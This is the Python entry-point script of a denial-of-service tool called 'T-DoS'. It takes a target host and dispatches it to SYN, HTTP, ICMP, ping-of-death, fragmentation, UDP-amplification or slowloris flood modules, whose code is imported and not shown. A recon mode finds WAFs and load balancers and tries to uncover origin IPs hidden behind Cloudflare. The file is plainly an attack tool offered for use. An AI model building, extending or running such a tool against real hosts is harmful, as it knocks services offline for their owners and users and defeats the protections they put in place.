# Re-made with <3 by github.com/ParzivalHack
import argparse
import asyncio
from core.attack_manager import AttackManager, AttackConfig
from modules.ddos import (
    syn_flood, http_flood, ping_flood,
    ping_of_death, icmp_flood, ip_fragmentation,
    udp_amplification, slowloris
)
from modules.recon import waf_detector, cloudflare_bypass, load_balancer

parser = argparse.ArgumentParser(prog="T-DoS")
subparsers = parser.add_subparsers(dest='command')

# Attack Commands
attack_parser = subparsers.add_parser('attack')
attack_parser.add_argument("-t", "--target", required=True)
attack_parser.add_argument("-p", "--port", type=int)
attack_parser.add_argument("--packets", type=int, default=0)
attack_parser.add_argument("--duration", type=int, default=0)
attack_parser.add_argument("--threads", type=int, default=100)
attack_parser.add_argument("--attack", required=True, choices=[
    "syn", "http", "ping", "pod", "icmp", 
    "frag", "udp", "slowloris"
])

# Recon Commands
recon_parser = subparsers.add_parser('recon')
recon_parser.add_argument("-t", "--target", required=True)
recon_parser.add_argument("--waf", action="store_true")
recon_parser.add_argument("--cf-bypass", action="store_true")
recon_parser.add_argument("--detect-lb", action="store_true")

async def main():
    args = parser.parse_args()
    manager = AttackManager()
    
    if args.command == "attack":
        config = AttackConfig(
            target=args.target,
            port=args.port or 80,
            packets=args.packets,
            duration=args.duration,
            threads=args.threads
        )
        
        attack_map = {
            "syn": syn_flood.SynFlood(),
            "http": http_flood.HTTPFlood(),
            "ping": ping_flood.PingFlood(),
            "pod": ping_of_death.PingOfDeath(),
            "icmp": icmp_flood.ICMPFlood(),
            "frag": ip_fragmentation.IPFragmentation(),
            "udp": udp_amplification.UDPAmplification(),
            "slowloris": slowloris.Slowloris()
        }
        
        await manager.launch_attack(attack_map[args.attack].attack, config)
        
    elif args.command == "recon":
        if args.waf:
            detector = waf_detector.WAFDetector(args.target)
            print("WAF Detection Result:", detector.detect())
        elif args.cf_bypass:
            bypass = cloudflare_bypass.CloudflareBypass(args.target)
            print("Origin IPs:", bypass.find_origin_ips())
        elif args.detect_lb:
            detector = load_balancer.LoadBalancerDetector(args.target)
            print("Load Balancer Detected:", detector.detect())

if __name__ == "__main__":
    asyncio.run(main())